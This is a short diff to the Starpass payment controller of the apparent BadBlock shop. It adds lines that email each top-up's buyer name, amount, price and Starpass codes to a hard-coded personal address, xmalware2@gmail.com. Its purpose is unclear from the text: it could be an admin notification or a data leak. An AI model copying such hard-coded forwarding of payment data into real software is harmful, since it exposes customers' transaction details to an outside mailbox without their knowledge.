@@ -145,6 +145,10 @@ class StarpassController extends Controller
             $mailContent = str_replace("(lien)", $insertedId, $mailContent);
             $mail = new \App\Mail(true);
             $mail->sendMail($this->session->get('user')["email"], "BadBlock - Paiement effectué", $mailContent);
+
+            $mailContent = $name." recharge +".$virtual_currency." pts boutique (".$offer['price']." € - starpass - codes : ".$ccodes.")";
+            $mail = new \App\Mail(true);
+            $mail->sendMail("xmalware2@gmail.com", "BadBlock - Rechargement", $mailContent);
         }
 
         return $this->redirect($response, '/shop/recharge/success');
